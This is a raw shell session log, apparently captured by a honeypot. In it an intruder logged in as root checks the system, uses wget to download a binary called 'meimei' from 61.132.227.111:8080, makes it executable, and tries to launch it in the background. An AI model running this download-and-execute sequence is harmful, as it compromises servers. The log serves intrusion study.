[4hAWSWeb:~# w
[4l 18:32:16 up 10 days, 23:53,  1 users, load averages: 0.09 0.05 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/2    125.65.82.89      18:32    0.09   0.05   0.05 w
[4hAWSWeb:~# uname -a
[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
[4hAWSWeb:~# wget http://61.132.227.111:8080/meimei
[4l--2013-11-03 18:32:32--  http://61.132.227.111:8080/meimei
Connecting to 61.132.227.111:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1524643 (1M) [application/octet-stream]
Saving to: `meimei


 0% [>                                      ] 1,460        3K/s  eta 7m 51s
 0% [>                                      ] 4,380        3K/s  eta 6m 21s
 1% [>                                      ] 18,836       6K/s  eta 3m 42s
 1% [>                                      ] 23,180       5K/s  eta 4m 39s
 1% [>                                      ] 24,628       4K/s  eta 5m 35s
 1% [>                                      ] 24,820       4K/s  eta 6m 12s
 1% [>                                      ] 28,972       3K/s  eta 6m 14s
 2% [>                                      ] 31,868       3K/s  eta 7m 48s
 2% [>                                      ] 36,500       3K/s  eta 7m 23s
81% [===============================>       ] 1,247,604    5K/s  eta 50s
81% [===============================>       ] 1,250,056    5K/s  eta 49s
82% [================================>      ] 1,251,796    5K/s  eta 50s
82% [================================>      ] 1,252,844    5K/s  eta 49s
82% [================================>      ] 1,259,132    5K/s  eta 49s
82% [================================>      ] 1,260,276    5K/s  eta 49s
82% [================================>      ] 1,261,752    5K/s  eta 48s
82% [================================>      ] 1,264,896    5K/s  eta 48s
82% [================================>      ] 1,265,420    5K/s  eta 48s
83% [================================>      ] 1,267,576    5K/s  eta 48s
83% [================================>      ] 1,269,612    5K/s  eta 47s
83% [================================>      ] 1,270,660    5K/s  eta 47s
83% [================================>      ] 1,274,328    5K/s  eta 47s
83% [================================>      ] 1,277,472    5K/s  eta 46s
83% [================================>      ] 1,280,616    5K/s  eta 45s
84% [================================>      ] 1,282,712    5K/s  eta 45s
84% [================================>      ] 1,285,856    5K/s  eta 45s
84% [=================================>     ] 1,292,668    5K/s  eta 43s
85% [=================================>     ] 1,296,860    5K/s  eta 43s
85% [=================================>     ] 1,302,624    5K/s  eta 41s
85% [=================================>     ] 1,304,076    5K/s  eta 41s
85% [=================================>     ] 1,309,916    5K/s  eta 40s
86% [=================================>     ] 1,312,580    5K/s  eta 40s
86% [=================================>     ] 1,317,820    5K/s  eta 39s
86% [=================================>     ] 1,323,060    5K/s  eta 38s
86% [=================================>     ] 1,324,632    5K/s  eta 37s
87% [=================================>     ] 1,328,300    5K/s  eta 37s
87% [==================================>    ] 1,334,064    5K/s  eta 36s
87% [==================================>    ] 1,338,256    5K/s  eta 35s
88% [==================================>    ] 1,341,924    5K/s  eta 34s
88% [==================================>    ] 1,345,068    5K/s  eta 34s
88% [==================================>    ] 1,346,116    5K/s  eta 34s
88% [==================================>    ] 1,348,212    5K/s  eta 33s
88% [==================================>    ] 1,351,356    5K/s  eta 33s
88% [==================================>    ] 1,355,548    5K/s  eta 32s
88% [==================================>    ] 1,356,596    5K/s  eta 32s
89% [==================================>    ] 1,357,644    5K/s  eta 32s
89% [==================================>    ] 1,360,788    5K/s  eta 31s
89% [==================================>    ] 1,361,016    5K/s  eta 31s
89% [==================================>    ] 1,361,540    5K/s  eta 31s
89% [==================================>    ] 1,366,552    5K/s  eta 30s
89% [==================================>    ] 1,367,600    5K/s  eta 30s
89% [===================================>   ] 1,369,776    5K/s  eta 30s
89% [===================================>   ] 1,371,792    5K/s  eta 30s
90% [===================================>   ] 1,375,460    5K/s  eta 29s
90% [===================================>   ] 1,380,700    5K/s  eta 28s
91% [===================================>   ] 1,388,560    5K/s  eta 26s
91% [===================================>   ] 1,399,576    5K/s  eta 24s
92% [===================================>   ] 1,404,280    5K/s  eta 23s
92% [====================================>  ] 1,407,424    5K/s  eta 22s
92% [====================================>  ] 1,411,092    5K/s  eta 22s
92% [====================================>  ] 1,414,236    5K/s  eta 21s
93% [====================================>  ] 1,419,476    5K/s  eta 20s
93% [====================================>  ] 1,425,240    5K/s  eta 19s
93% [====================================>  ] 1,429,956    5K/s  eta 18s
93% [====================================>  ] 1,433,100    5K/s  eta 17s
94% [====================================>  ] 1,439,912    5K/s  eta 16s
94% [====================================>  ] 1,442,008    5K/s  eta 16s
94% [====================================>  ] 1,444,628    5K/s  eta 15s
94% [=====================================> ] 1,446,724    5K/s  eta 15s
95% [=====================================> ] 1,454,060    5K/s  eta 13s
95% [=====================================> ] 1,460,348    5K/s  eta 12s
96% [=====================================> ] 1,466,636    5K/s  eta 11s
96% [=====================================> ] 1,475,020    5K/s  eta 9s 
97% [=====================================> ] 1,479,212    5K/s  eta 8s
97% [=====================================> ] 1,482,880    5K/s  eta 8s
97% [======================================>] 1,486,024    5K/s  eta 7s
97% [======================================>] 1,486,548    5K/s  eta 7s
97% [======================================>] 1,487,596    5K/s  eta 7s
97% [======================================>] 1,490,740    5K/s  eta 6s
98% [======================================>] 1,496,504    5K/s  eta 5s
98% [======================================>] 1,508,556    5K/s  eta 3s
99% [======================================>] 1,511,700    5K/s  eta 2s
99% [======================================>] 1,517,988    5K/s  eta 1s
99% [======================================>] 1,520,084    5K/s  eta 0s
99% [======================================>] 1,521,616    5K/s  eta 0s
99% [======================================>] 1,522,704    5K/s  eta 0s
100%[======================================>] 1,524,643    5K/s

2013-11-03 18:37:28 (5 KB/s) - `meimei' saved [1524643/1524643]
[4hAWSWeb:~# w
[4l 07:59:47 up 11 days, 13:21,  1 users, load averages: 0.09 0.05 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/2    125.65.82.89      18:32    0.09   0.05   0.05 w
[4hAWSWeb:~# chmod 0755 ./meimei
[4l[4hAWSWeb:~# nohup /root/meimei > /dev/null 2>&1 &
bash: nohup: command not found
AWSWeb:~# 
